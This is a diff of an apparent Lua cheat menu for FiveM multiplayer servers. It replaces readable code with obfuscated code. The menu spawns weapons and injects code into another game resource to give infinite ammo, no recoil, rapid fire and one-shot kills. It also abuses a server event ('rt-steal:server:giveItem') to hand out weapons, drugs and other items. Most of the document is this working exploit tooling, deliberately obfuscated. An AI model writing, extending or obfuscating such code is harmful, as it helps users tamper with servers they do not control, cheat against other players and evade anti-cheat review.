-MachoMenuButton(WeaponGroup, "Pump Shotgun MK2", function() GiveWeapon("WEAPON_PUMPSHOTGUN_MK2") end)
-MachoMenuButton(WeaponGroup, "Sawed Off Shotgun", function() GiveWeapon("WEAPON_SAWNOFFSHOTGUN") end)
-MachoMenuButton(WeaponGroup, "Assault Shotgun", function() GiveWeapon("WEAPON_ASSAULTSHOTGUN") end)
-MachoMenuButton(WeaponGroup, "Bullpup Shotgun", function() GiveWeapon("WEAPON_BULLPUPSHOTGUN") end)
-MachoMenuButton(WeaponGroup, "Heavy Shotgun", function() GiveWeapon("WEAPON_HEAVYSHOTGUN") end)
-MachoMenuButton(WeaponGroup, "Double Barrel Shotgun", function() GiveWeapon("WEAPON_DBSHOTGUN") end)
-MachoMenuButton(WeaponGroup, "Sweeper Shotgun", function() GiveWeapon("WEAPON_AUTOSHOTGUN") end)
-
--- ============================================================
--- RIFLES
--- ============================================================
-
-MachoMenuText(WeaponGroup, "RIFLES")
-
-MachoMenuButton(WeaponGroup, "Assault Rifle", function() GiveWeapon("WEAPON_ASSAULTRIFLE") end)
-MachoMenuButton(WeaponGroup, "Assault Rifle MK2", function() GiveWeapon("WEAPON_ASSAULTRIFLE_MK2") end)
-MachoMenuButton(WeaponGroup, "Carbine Rifle", function() GiveWeapon("WEAPON_CARBINERIFLE") end)
-MachoMenuButton(WeaponGroup, "Carbine Rifle MK2", function() GiveWeapon("WEAPON_CARBINERIFLE_MK2") end)
-MachoMenuButton(WeaponGroup, "Advanced Rifle", function() GiveWeapon("WEAPON_ADVANCEDRIFLE") end)
-MachoMenuButton(WeaponGroup, "Special Carbine", function() GiveWeapon("WEAPON_SPECIALCARBINE") end)
-MachoMenuButton(WeaponGroup, "Special Carbine MK2", function() GiveWeapon("WEAPON_SPECIALCARBINE_MK2") end)
-MachoMenuButton(WeaponGroup, "Bullpup Rifle", function() GiveWeapon("WEAPON_BULLPUPRIFLE") end)
-MachoMenuButton(WeaponGroup, "Bullpup Rifle MK2", function() GiveWeapon("WEAPON_BULLPUPRIFLE_MK2") end)
-MachoMenuButton(WeaponGroup, "Compact Rifle", function() GiveWeapon("WEAPON_COMPACTRIFLE") end)
-MachoMenuButton(WeaponGroup, "Military Rifle", function() GiveWeapon("WEAPON_MILITARYRIFLE") end)
-MachoMenuButton(WeaponGroup, "Heavy Rifle", function() GiveWeapon("WEAPON_HEAVYRIFLE") end)
-MachoMenuButton(WeaponGroup, "Battle Rifle", function() GiveWeapon("WEAPON_BATTLERIFLE") end)
-MachoMenuButton(WeaponGroup, "Tactical Rifle", function() GiveWeapon("WEAPON_TACTICALRIFLE") end)
-MachoMenuButton(WeaponGroup, "MG", function() GiveWeapon("WEAPON_MG") end)
-MachoMenuButton(WeaponGroup, "Combat MG", function() GiveWeapon("WEAPON_COMBATMG") end)
-MachoMenuButton(WeaponGroup, "Combat MG MK2", function() GiveWeapon("WEAPON_COMBATMG_MK2") end)
-
--- ============================================================
--- SNIPERS
--- ============================================================
-
-MachoMenuText(WeaponGroup, "SNIPERS")
-
-MachoMenuButton(WeaponGroup, "Sniper Rifle", function() GiveWeapon("WEAPON_SNIPERRIFLE") end)
-MachoMenuButton(WeaponGroup, "Heavy Sniper", function() GiveWeapon("WEAPON_HEAVYSNIPER") end)
-MachoMenuButton(WeaponGroup, "Heavy Sniper MK2", function() GiveWeapon("WEAPON_HEAVYSNIPER_MK2") end)
-MachoMenuButton(WeaponGroup, "Marksman Rifle", function() GiveWeapon("WEAPON_MARKSMANRIFLE") end)
-MachoMenuButton(WeaponGroup, "Marksman Rifle MK2", function() GiveWeapon("WEAPON_MARKSMANRIFLE_MK2") end)
-
--- ============================================================
--- HEAVY WEAPONS
--- ============================================================
-
-MachoMenuText(WeaponGroup, "HEAVY WEAPONS")
-
-MachoMenuButton(WeaponGroup, "RPG", function() GiveWeapon("WEAPON_RPG", 50) end)
-MachoMenuButton(WeaponGroup, "Minigun", function() GiveWeapon("WEAPON_MINIGUN", 500) end)
-MachoMenuButton(WeaponGroup, "Grenade Launcher", function() GiveWeapon("WEAPON_GRENADELAUNCHER", 50) end)
-MachoMenuButton(WeaponGroup, "Compact Grenade Launcher", function() GiveWeapon("WEAPON_COMPACTLAUNCHER", 50) end)
-MachoMenuButton(WeaponGroup, "Homing Launcher", function() GiveWeapon("WEAPON_HOMINGLAUNCHER", 50) end)
-MachoMenuButton(WeaponGroup, "Railgun", function() GiveWeapon("WEAPON_RAILGUN", 50) end)
-MachoMenuButton(WeaponGroup, "Firework Launcher", function() GiveWeapon("WEAPON_FIREWORK", 50) end)
-MachoMenuButton(WeaponGroup, "Up-n-Atomizer", function() GiveWeapon("WEAPON_RAYGUN", 50) end)
-MachoMenuButton(WeaponGroup, "Hellbringer", function() GiveWeapon("WEAPON_RAYMINIGUN", 500) end)
-MachoMenuButton(WeaponGroup, "Widowmaker", function() GiveWeapon("WEAPON_RAYCARBINE", 500) end)
-
--- ============================================================
--- THROWABLES
--- ============================================================
-
-MachoMenuText(WeaponGroup, "THROWABLES")
-
-MachoMenuButton(WeaponGroup, "Grenade", function() GiveWeapon("WEAPON_GRENADE", 10) end)
-MachoMenuButton(WeaponGroup, "Sticky Bomb", function() GiveWeapon("WEAPON_STICKYBOMB", 10) end)
-MachoMenuButton(WeaponGroup, "Molotov Cocktail", function() GiveWeapon("WEAPON_MOLOTOV", 10) end)
-MachoMenuButton(WeaponGroup, "Pipe Bomb", function() GiveWeapon("WEAPON_PIPEBOMB", 10) end)
-MachoMenuButton(WeaponGroup, "Smoke Grenade", function() GiveWeapon("WEAPON_SMOKEGRENADE", 10) end)
-MachoMenuButton(WeaponGroup, "Proximity Mine", function() GiveWeapon("WEAPON_PROXMINE", 10) end)
-MachoMenuButton(WeaponGroup, "BZ Gas", function() GiveWeapon("WEAPON_BZGAS", 10) end)
-
--- ============================================================
--- AMMO & RECOIL TOGGLES
--- ============================================================
-
-MachoMenuText(WeaponGroup, "TOGGLES")
-
--- Ammo Slider
-local ammoSlider = MachoMenuSlider(WeaponGroup, "Ammo Quantity", S1_weapon_ammo, 1, 9999, "rds", 10, function(value)
-    S1_weapon_ammo = value
-end)
-
--- Infinite Ammo Toggle
-local infiniteAmmoActive = false
-MachoMenuCheckbox(WeaponGroup, "Infinite Ammo", function()
-    infiniteAmmoActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+            ]],v455,v456));end MachoMenuNotification("Easy Spawn","Spawned "   .. v455   .. " x"   .. v456 );v930=877 -(461 + 414) ;end if (v930==0) then v931=false;pcall(function() local v969=0;while true do if (v969==(0 + 0)) then TriggerServerEvent("rt-steal:server:giveItem",v455,v456);v931=true;break;end end end);v930=1;end end end break;end if (v458==(0 + 0)) then v456=v456 or 1 ;v457=v457 or "lumberjack" ;v458=1;end end end MachoMenuText(v175,"WEAPONS (RT Steal)");MachoMenuButton(v175,"Pistol",function() v176("weapon_pistol",1,"steal");end);MachoMenuButton(v175,"Combat Pistol",function() v176("weapon_combatpistol",1 + 0 ,"steal");end);MachoMenuButton(v175,"AP Pistol",function() v176("weapon_appistol",1,"steal");end);MachoMenuButton(v175,"Pistol 50",function() v176("weapon_pistol50",1,"steal");end);MachoMenuButton(v175,"SMG",function() v176("weapon_smg",1 + 0 ,"steal");end);MachoMenuButton(v175,"Micro SMG",function() v176("weapon_microsmg",251 -(172 + 78) ,"steal");end);MachoMenuButton(v175,"Assault SMG",function() v176("weapon_assaultsmg",1,"steal");end);MachoMenuButton(v175,"Assault Rifle",function() v176("weapon_assaultrifle",1 -0 ,"steal");end);MachoMenuButton(v175,"Carbine Rifle",function() v176("weapon_carbinerifle",1 + 0 ,"steal");end);MachoMenuButton(v175,"Advanced Rifle",function() v176("weapon_advancedrifle",1 -0 ,"steal");end);MachoMenuButton(v175,"Pump Shotgun",function() v176("weapon_pumpshotgun",1,"steal");end);MachoMenuButton(v175,"Sawed Off Shotgun",function() v176("weapon_sawnoffshotgun",1 + 0 ,"steal");end);MachoMenuButton(v175,"Assault Shotgun",function() v176("weapon_assaultshotgun",1,"steal");end);MachoMenuButton(v175,"Sniper Rifle",function() v176("weapon_sniperrifle",1,"steal");end);MachoMenuButton(v175,"Heavy Sniper",function() v176("weapon_heavysniper",1 + 0 ,"steal");end);MachoMenuButton(v175,"RPG",function() v176("weapon_rpg",1 -0 ,"steal");end);MachoMenuButton(v175,"Minigun",function() v176("weapon_minigun",1 -0 ,"steal");end);MachoMenuButton(v175,"Grenade Launcher",function() v176("weapon_grenadelauncher",1 + 0 ,"steal");end);MachoMenuButton(v175,"Railgun",function() v176("weapon_railgun",1 + 0 ,"steal");end);MachoMenuButton(v175,"Stun Gun (Taser)",function() v176("weapon_stungun",1,"steal");end);MachoMenuButton(v175,"Knife",function() v176("weapon_knife",1 + 0 ,"steal");end);MachoMenuButton(v175,"Bat",function() v176("weapon_bat",3 -2 ,"steal");end);MachoMenuText(v175,"ITEMS (RT Steal)");MachoMenuButton(v175,"Lockpick",function() v176("lockpick",11 -6 ,"steal");end);MachoMenuButton(v175,"Advanced Lockpick",function() v176("advancedlockpick",2 + 3 ,"steal");end);MachoMenuButton(v175,"Handcuffs",function() v176("handcuffs",3 + 2 ,"steal");end);MachoMenuButton(v175,"Phone",function() v176("phone",1,"steal");end);MachoMenuButton(v175,"medkit",function() v176("medkit",1,"steal");end);MachoMenuButton(v175,"Drill",function() v176("drill",1,"steal");end);MachoMenuButton(v175,"Fal",function() v176("weapon_fal",448 -(133 + 314) ,"steal");end);MachoMenuButton(v175,"Repair Kit",function() v176("repairkit",1 + 4 ,"steal");end);MachoMenuButton(v175,"Bandage",function() v176("bandage",223 -(199 + 14) ,"steal");end);MachoMenuButton(v175,"Painkillers",function() v176("painkillers",35 -25 ,"steal");end);MachoMenuButton(v175,"Armor",function() v176("armor",1,"steal");end);MachoMenuText(v175,"DRUGS (RT Steal)");MachoMenuButton(v175,"Weed",function() v176("weed",1559 -(647 + 902) ,"steal");end);MachoMenuButton(v175,"Cocaine",function() v176("cocaine",10,"steal");end);MachoMenuButton(v175,"Meth",function() v176("meth",30 -20 ,"steal");end);MachoMenuButton(v175,"Crack",function() v176("crack",243 -(85 + 148) ,"steal");end);MachoMenuButton(v175,"Heroin",function() v176("heroin",1299 -(426 + 863) ,"steal");end);MachoMenuButton(v175,"Oxy",function() v176("oxy",10,"steal");end);MachoMenuText(v175,"AMMO (RT Steal)");MachoMenuButton(v175,"Pistol Ammo x100",function() v176("pistol_ammo",100,"steal");end);MachoMenuButton(v175,"SMG Ammo x100",function() v176("smg_ammo",468 -368 ,"steal");end);MachoMenuButton(v175,"Rifle Ammo x100",function() v176("rifle_ammo",1754 -(873 + 781) ,"steal");end);MachoMenuButton(v175,"Shotgun Ammo x100",function() v176("shotgun_ammo",133 -33 ,"steal");end);MachoMenuButton(v175,"Sniper Ammo x100",function() v176("sniper_ammo",100,"steal");end);MachoMenuButton(v175,"RPG Ammo x10",function() v176("rpg_ammo",10,"steal");end);MachoMenuButton(v175,"sniper_full",function() v176("sniper_full",29 -18 ,"steal");end);MachoMenuButton(v175,"rifle_full",function() v176("rifle_full",5 + 6 ,"steal");end);MachoMenuButton(v175,"pistol_full",function() v176("pistol_full",7,"steal");end);MachoMenuText(v175,"LUMBERJACK ITEMS");MachoMenuButton(v175,"Wood",function() v176("wood",50,"lumberjack");end);MachoMenuButton(v175,"Plank",function() v176("plank",50,"lumberjack");end);MachoMenuButton(v175,"Log",function() v176("log",184 -134 ,"lumberjack");end);MachoMenuButton(v175,"Sawdust",function() v176("sawdust",50,"lumberjack");end);MachoMenuText(v175,"FOOD & DRINK (RT Steal)");MachoMenuButton(v175,"Water Bottle",function() v176("water_bottle",14 -4 ,"steal");end);MachoMenuButton(v175,"Sandwich",function() v176("sandwich",10,"steal");end);MachoMenuButton(v175,"Burger",function() v176("burger",10,"steal");end);MachoMenuButton(v175,"Donut",function() v176("donut",29 -19 ,"steal");end);MachoMenuButton(v175,"Coffee",function() v176("coffee",1957 -(414 + 1533) ,"steal");end);MachoMenuButton(v175,"Energy Drink",function() v176("energydrink",10,"steal");end);MachoMenuText(v175,"MISC ITEMS (RT Steal)");MachoMenuButton(v175,"Laptop",function() v176("laptop",1,"steal");end);MachoMenuButton(v175,"Hacking Device",function() v176("hacking_device",1,"steal");end);MachoMenuButton(v175,"USB Drive",function() v176("usb_drive",5 + 0 ,"steal");end);MachoMenuButton(v175,"Radio",function() v176("radio",556 -(443 + 112) ,"steal");end);MachoMenuButton(v175,"Binoculars",function() v176("binoculars",1,"steal");end);MachoMenuButton(v175,"Scuba Gear",function() v176("scuba_gear",1480 -(888 + 591) ,"steal");end);MachoMenuButton(v175,"Parachute",function() v176("parachute",1,"steal");end);print("[Easy Spawn] Tab loaded!");local v177=MachoMenuAddTab(v4,"Weapons");local v178=MachoMenuGroup(v177,"Weapon Options",v3,23 -14 ,(v1.x-v3) + 150 ,v1.y);local v179=15 + 235 ;local function v180(v459,v460) v460=v460 or v179 ;local v461=GetHashKey(v459);if (v461 and (v461~=(0 -0))) then GiveWeaponToPed(PlayerPedId(),v461,v460,false,true);SetCurrentPedWeapon(PlayerPedId(),v461,true);MachoMenuNotification("Weapon","Spawned: "   .. v459 );print("[Weapon] Spawned: "   .. v459   .. " x"   .. v460 );else MachoMenuNotification("Error","Invalid weapon: "   .. v459 );end end MachoMenuText(v178,"MELEE WEAPONS");MachoMenuButton(v178,"Knife",function() v180("WEAPON_KNIFE",1);end);MachoMenuButton(v178,"Bat",function() v180("WEAPON_BAT",1 + 0 );end);MachoMenuButton(v178,"Hammer",function() v180("WEAPON_HAMMER",1 + 0 );end);MachoMenuButton(v178,"Crowbar",function() v180("WEAPON_CROWBAR",1 + 0 );end);MachoMenuButton(v178,"Golf Club",function() v180("WEAPON_GOLFCLUB",1 -0 );end);MachoMenuButton(v178,"Machete",function() v180("WEAPON_MACHETE",1 -0 );end);MachoMenuButton(v178,"Switchblade",function() v180("WEAPON_SWITCHBLADE",1);end);MachoMenuButton(v178,"Dagger",function() v180("WEAPON_DAGGER",1679 -(136 + 1542) );end);MachoMenuButton(v178,"Hatchet",function() v180("WEAPON_HATCHET",1);end);MachoMenuButton(v178,"Wrench",function() v180("WEAPON_WRENCH",1);end);MachoMenuButton(v178,"Nightstick",function() v180("WEAPON_NIGHTSTICK",3 -2 );end);MachoMenuButton(v178,"Bottle",function() v180("WEAPON_BOTTLE",1 + 0 );end);MachoMenuText(v178,"PISTOLS");MachoMenuButton(v178,"Pistol",function() v180("WEAPON_PISTOL");end);MachoMenuButton(v178,"Pistol MK2",function() v180("WEAPON_PISTOL_MK2");end);MachoMenuButton(v178,"Combat Pistol",function() v180("WEAPON_COMBATPISTOL");end);MachoMenuButton(v178,"AP Pistol",function() v180("WEAPON_APPISTOL");end);MachoMenuButton(v178,"Pistol 50",function() v180("WEAPON_PISTOL50");end);MachoMenuButton(v178,"Heavy Pistol",function() v180("WEAPON_HEAVYPISTOL");end);MachoMenuButton(v178,"SNS Pistol",function() v180("WEAPON_SNSPISTOL");end);MachoMenuButton(v178,"Vintage Pistol",function() v180("WEAPON_VINTAGEPISTOL");end);MachoMenuButton(v178,"Ceramic Pistol",function() v180("WEAPON_CERAMICPISTOL");end);MachoMenuButton(v178,"Flare Gun",function() v180("WEAPON_FLAREGUN");end);MachoMenuButton(v178,"Stun Gun (Taser)",function() v180("WEAPON_STUNGUN");end);MachoMenuButton(v178,"Revolver",function() v180("WEAPON_REVOLVER");end);MachoMenuButton(v178,"Double Action Revolver",function() v180("WEAPON_DOUBLEACTION");end);MachoMenuButton(v178,"Marksman Pistol",function() v180("WEAPON_MARKSMANPISTOL");end);MachoMenuText(v178,"SMGs");MachoMenuButton(v178,"SMG",function() v180("WEAPON_SMG");end);MachoMenuButton(v178,"SMG MK2",function() v180("WEAPON_SMG_MK2");end);MachoMenuButton(v178,"Micro SMG",function() v180("WEAPON_MICROSMG");end);MachoMenuButton(v178,"Assault SMG",function() v180("WEAPON_ASSAULTSMG");end);MachoMenuButton(v178,"Combat PDW",function() v180("WEAPON_COMBATPDW");end);MachoMenuButton(v178,"Machine Pistol",function() v180("WEAPON_MACHINEPISTOL");end);MachoMenuButton(v178,"Mini SMG",function() v180("WEAPON_MINISMG");end);MachoMenuButton(v178,"Gusenberg Sweeper",function() v180("WEAPON_GUSENBERG");end);MachoMenuText(v178,"SHOTGUNS");MachoMenuButton(v178,"Pump Shotgun",function() v180("WEAPON_PUMPSHOTGUN");end);MachoMenuButton(v178,"Pump Shotgun MK2",function() v180("WEAPON_PUMPSHOTGUN_MK2");end);MachoMenuButton(v178,"Sawed Off Shotgun",function() v180("WEAPON_SAWNOFFSHOTGUN");end);MachoMenuButton(v178,"Assault Shotgun",function() v180("WEAPON_ASSAULTSHOTGUN");end);MachoMenuButton(v178,"Bullpup Shotgun",function() v180("WEAPON_BULLPUPSHOTGUN");end);MachoMenuButton(v178,"Heavy Shotgun",function() v180("WEAPON_HEAVYSHOTGUN");end);MachoMenuButton(v178,"Double Barrel Shotgun",function() v180("WEAPON_DBSHOTGUN");end);MachoMenuButton(v178,"Sweeper Shotgun",function() v180("WEAPON_AUTOSHOTGUN");end);MachoMenuText(v178,"RIFLES");MachoMenuButton(v178,"Assault Rifle",function() v180("WEAPON_ASSAULTRIFLE");end);MachoMenuButton(v178,"Assault Rifle MK2",function() v180("WEAPON_ASSAULTRIFLE_MK2");end);MachoMenuButton(v178,"Carbine Rifle",function() v180("WEAPON_CARBINERIFLE");end);MachoMenuButton(v178,"Carbine Rifle MK2",function() v180("WEAPON_CARBINERIFLE_MK2");end);MachoMenuButton(v178,"Advanced Rifle",function() v180("WEAPON_ADVANCEDRIFLE");end);MachoMenuButton(v178,"Special Carbine",function() v180("WEAPON_SPECIALCARBINE");end);MachoMenuButton(v178,"Special Carbine MK2",function() v180("WEAPON_SPECIALCARBINE_MK2");end);MachoMenuButton(v178,"Bullpup Rifle",function() v180("WEAPON_BULLPUPRIFLE");end);MachoMenuButton(v178,"Bullpup Rifle MK2",function() v180("WEAPON_BULLPUPRIFLE_MK2");end);MachoMenuButton(v178,"Compact Rifle",function() v180("WEAPON_COMPACTRIFLE");end);MachoMenuButton(v178,"Military Rifle",function() v180("WEAPON_MILITARYRIFLE");end);MachoMenuButton(v178,"Heavy Rifle",function() v180("WEAPON_HEAVYRIFLE");end);MachoMenuButton(v178,"Battle Rifle",function() v180("WEAPON_BATTLERIFLE");end);MachoMenuButton(v178,"Tactical Rifle",function() v180("WEAPON_TACTICALRIFLE");end);MachoMenuButton(v178,"MG",function() v180("WEAPON_MG");end);MachoMenuButton(v178,"Combat MG",function() v180("WEAPON_COMBATMG");end);MachoMenuButton(v178,"Combat MG MK2",function() v180("WEAPON_COMBATMG_MK2");end);MachoMenuText(v178,"SNIPERS");MachoMenuButton(v178,"Sniper Rifle",function() v180("WEAPON_SNIPERRIFLE");end);MachoMenuButton(v178,"Heavy Sniper",function() v180("WEAPON_HEAVYSNIPER");end);MachoMenuButton(v178,"Heavy Sniper MK2",function() v180("WEAPON_HEAVYSNIPER_MK2");end);MachoMenuButton(v178,"Marksman Rifle",function() v180("WEAPON_MARKSMANRIFLE");end);MachoMenuButton(v178,"Marksman Rifle MK2",function() v180("WEAPON_MARKSMANRIFLE_MK2");end);MachoMenuText(v178,"HEAVY WEAPONS");MachoMenuButton(v178,"RPG",function() v180("WEAPON_RPG",79 -29 );end);MachoMenuButton(v178,"Minigun",function() v180("WEAPON_MINIGUN",362 + 138 );end);MachoMenuButton(v178,"Grenade Launcher",function() v180("WEAPON_GRENADELAUNCHER",536 -(68 + 418) );end);MachoMenuButton(v178,"Compact Grenade Launcher",function() v180("WEAPON_COMPACTLAUNCHER",135 -85 );end);MachoMenuButton(v178,"Homing Launcher",function() v180("WEAPON_HOMINGLAUNCHER",50);end);MachoMenuButton(v178,"Railgun",function() v180("WEAPON_RAILGUN",90 -40 );end);MachoMenuButton(v178,"Firework Launcher",function() v180("WEAPON_FIREWORK",50);end);MachoMenuButton(v178,"Up-n-Atomizer",function() v180("WEAPON_RAYGUN",50);end);MachoMenuButton(v178,"Hellbringer",function() v180("WEAPON_RAYMINIGUN",500);end);MachoMenuButton(v178,"Widowmaker",function() v180("WEAPON_RAYCARBINE",500);end);MachoMenuText(v178,"THROWABLES");MachoMenuButton(v178,"Grenade",function() v180("WEAPON_GRENADE",9 + 1 );end);MachoMenuButton(v178,"Sticky Bomb",function() v180("WEAPON_STICKYBOMB",1102 -(770 + 322) );end);MachoMenuButton(v178,"Molotov Cocktail",function() v180("WEAPON_MOLOTOV",1 + 9 );end);MachoMenuButton(v178,"Pipe Bomb",function() v180("WEAPON_PIPEBOMB",10);end);MachoMenuButton(v178,"Smoke Grenade",function() v180("WEAPON_SMOKEGRENADE",3 + 7 );end);MachoMenuButton(v178,"Proximity Mine",function() v180("WEAPON_PROXMINE",2 + 8 );end);MachoMenuButton(v178,"BZ Gas",function() v180("WEAPON_BZGAS",10);end);MachoMenuText(v178,"TOGGLES");local v181=MachoMenuSlider(v178,"Ammo Quantity",v179,1 -0 ,9999,"rds",19 -9 ,function(v462) v179=v462;end);local v182=false;MachoMenuCheckbox(v178,"Infinite Ammo",function() local v463=0;while true do if (v463==0) then v182=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         infiniteAmmoActive = true
         CreateThread(function()
             while infiniteAmmoActive do
@@ -9088,11 +3867,7 @@ MachoMenuCheckbox(WeaponGroup, "Infinite Ammo", function()
                 end
             end
         end)
-    ]])
-    MachoMenuNotification("Ammo", "Infinite Ammo ON")
-end, function()
-    infiniteAmmoActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v463=1;end if (v463==(2 -1)) then MachoMenuNotification("Ammo","Infinite Ammo ON");break;end end end,function() local v464=0 -0 ;while true do if (v464==(1 + 0)) then MachoMenuNotification("Ammo","Infinite Ammo OFF");break;end if (v464==0) then v182=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         infiniteAmmoActive = false
         local ped = PlayerPedId()
         local weapon = GetSelectedPedWeapon(ped)
@@ -9100,15 +3875,7 @@ end, function()
             SetPedInfiniteAmmo(ped, false, weapon)
             SetPedInfiniteAmmoClip(ped, false)
         end
-    ]])
-    MachoMenuNotification("Ammo", "Infinite Ammo OFF")
-end)
-
--- No Recoil Toggle
-local noRecoilActive = false
-MachoMenuCheckbox(WeaponGroup, "No Recoil", function()
-    noRecoilActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v464=1;end end end);local v183=false;MachoMenuCheckbox(v178,"No Recoil",function() v183=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         noRecoilActive = true
         CreateThread(function()
             while noRecoilActive do
@@ -9123,24 +3890,12 @@ MachoMenuCheckbox(WeaponGroup, "No Recoil", function()
                 SetPlayerWeaponDefenseModifier(PlayerId(), 1.0)
             end
         end)
-    ]])
-    MachoMenuNotification("Recoil", "No Recoil ON")
-end, function()
-    noRecoilActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Recoil","No Recoil ON");end,function() local v465=0 -0 ;while true do if (0==v465) then v183=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         noRecoilActive = false
         SetPedWeaponRecoilModifier(PlayerPedId(), 1.0)
         SetPedWeaponRecoilShakeMultiplier(PlayerPedId(), 1.0)
         StopGameplayCamShaking(false)
-    ]])
-    MachoMenuNotification("Recoil", "No Recoil OFF")
-end)
-
--- No Reload Toggle
-local noReloadActive = false
-MachoMenuCheckbox(WeaponGroup, "No Reload", function()
-    noReloadActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v465=1 + 0 ;end if (v465==(1 + 0)) then MachoMenuNotification("Recoil","No Recoil OFF");break;end end end);local v184=false;MachoMenuCheckbox(v178,"No Reload",function() local v466=0 + 0 ;while true do if (v466==1) then MachoMenuNotification("Reload","No Reload ON");break;end if (v466==(0 -0)) then v184=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         noReloadActive = true
         CreateThread(function()
             while noReloadActive do
@@ -9148,21 +3903,9 @@ MachoMenuCheckbox(WeaponGroup, "No Reload", function()
                 RefillAmmoInstantly(PlayerPedId())
             end
         end)
-    ]])
-    MachoMenuNotification("Reload", "No Reload ON")
-end, function()
-    noReloadActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v466=1 -0 ;end end end,function() local v467=0 + 0 ;while true do if (v467==(4 -3)) then MachoMenuNotification("Reload","No Reload OFF");break;end if (v467==(0 -0)) then v184=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         noReloadActive = false
-    ]])
-    MachoMenuNotification("Reload", "No Reload OFF")
-end)
-
--- No Spread Toggle
-local noSpreadActive = false
-MachoMenuCheckbox(WeaponGroup, "No Spread", function()
-    noSpreadActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v467=1;end end end);local v185=false;MachoMenuCheckbox(v178,"No Spread",function() v185=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         noSpreadActive = true
         CreateThread(function()
             while noSpreadActive do
@@ -9172,23 +3915,11 @@ MachoMenuCheckbox(WeaponGroup, "No Spread", function()
                 SetPedWeaponAccuracyModifier(PlayerPedId(), 100.0)
             end
         end)
-    ]])
-    MachoMenuNotification("Spread", "No Spread ON")
-end, function()
-    noSpreadActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Spread","No Spread ON");end,function() v185=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         noSpreadActive = false
         SetPedAccuracy(PlayerPedId(), 50)
         SetPedWeaponAccuracyMultiplier(PlayerPedId(), 1.0)
-    ]])
-    MachoMenuNotification("Spread", "No Spread OFF")
-end)
-
--- Rapid Fire Toggle
-local rapidFireActive = false
-MachoMenuCheckbox(WeaponGroup, "Rapid Fire", function()
-    rapidFireActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Spread","No Spread OFF");end);local v186=false;MachoMenuCheckbox(v178,"Rapid Fire",function() v186=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         rapidFireActive = true
         CreateThread(function()
             while rapidFireActive do
@@ -9211,53 +3942,9 @@ MachoMenuCheckbox(WeaponGroup, "Rapid Fire", function()
                 end
             end
         end)
-    ]])
-    MachoMenuNotification("Rapid Fire", "Rapid Fire ON")
-end, function()
-    rapidFireActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Rapid Fire","Rapid Fire ON");end,function() local v468=0 + 0 ;while true do if (v468==(0 -0)) then v186=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         rapidFireActive = false
-    ]])
-    MachoMenuNotification("Rapid Fire", "Rapid Fire OFF")
-end)
-
--- One Shot Kill Toggle
-local oneShotActive = false
-MachoMenuCheckbox(WeaponGroup, "One Shot Kill", function()
-    oneShotActive = true
-    SetPlayerWeaponDamageModifier(PlayerId(), 9999.0)
-    MachoMenuNotification("One Shot", "One Shot Kill ON")
-end, function()
-    oneShotActive = false
-    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
-    MachoMenuNotification("One Shot", "One Shot Kill OFF")
-end)
-
--- Remove All Weapons
-MachoMenuButton(WeaponGroup, "Remove All Weapons", function()
-    RemoveAllPedWeapons(PlayerPedId(), true)
-    MachoMenuNotification("Weapons", "All weapons removed!")
-end)
-
--- Refill Ammo
-MachoMenuButton(WeaponGroup, "Refill Ammo", function()
-    local ped = PlayerPedId()
-    local weapon = GetSelectedPedWeapon(ped)
-    if weapon ~= nil and weapon ~= 0 and weapon ~= GetHashKey("WEAPON_UNARMED") then
-        SetPedAmmo(ped, weapon, 9999)
-        MachoMenuNotification("Ammo", "Ammo refilled!")
-    else
-        MachoMenuNotification("Error", "No weapon equipped!")
-    end
-end)
-
--- Weapon RGB Toggle
-local weaponRGBActive = false
-MachoMenuCheckbox(WeaponGroup, "Weapon RGB", function()
-    weaponRGBActive = true
-    local tints = {0, 1, 2, 3, 4, 5, 6, 7}
-    local index = 1
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v468=832 -(762 + 69) ;end if (v468==1) then MachoMenuNotification("Rapid Fire","Rapid Fire OFF");break;end end end);local v187=false;MachoMenuCheckbox(v178,"One Shot Kill",function() v187=true;SetPlayerWeaponDamageModifier(PlayerId(),32377 -22378 );MachoMenuNotification("One Shot","One Shot Kill ON");end,function() v187=false;SetPlayerWeaponDamageModifier(PlayerId(),1 + 0 );MachoMenuNotification("One Shot","One Shot Kill OFF");end);MachoMenuButton(v178,"Remove All Weapons",function() RemoveAllPedWeapons(PlayerPedId(),true);MachoMenuNotification("Weapons","All weapons removed!");end);MachoMenuButton(v178,"Refill Ammo",function() local v469=0 + 0 ;local v470;local v471;while true do if (0==v469) then v470=PlayerPedId();v471=GetSelectedPedWeapon(v470);v469=2 -1 ;end if ((1 + 0)==v469) then if ((v471~=nil) and (v471~=(0 + 0)) and (v471~=GetHashKey("WEAPON_UNARMED"))) then SetPedAmmo(v470,v471,38957 -28958 );MachoMenuNotification("Ammo","Ammo refilled!");else MachoMenuNotification("Error","No weapon equipped!");end break;end end end);local v188=false;MachoMenuCheckbox(v178,"Weapon RGB",function() v188=true;local v472={1320 -(1199 + 121) ,2 -1 ,1 + 1 ,6 -3 ,4 + 0 ,8 -3 ,6,10 -3 };local v473=1 + 0 ;MachoInjectResource2(NewThreadNs,"monitor",[[
         weaponRGBActive = true
         local tints = {0, 1, 2, 3, 4, 5, 6, 7}
         local index = 1
@@ -9273,23 +3960,9 @@ MachoMenuCheckbox(WeaponGroup, "Weapon RGB", function()
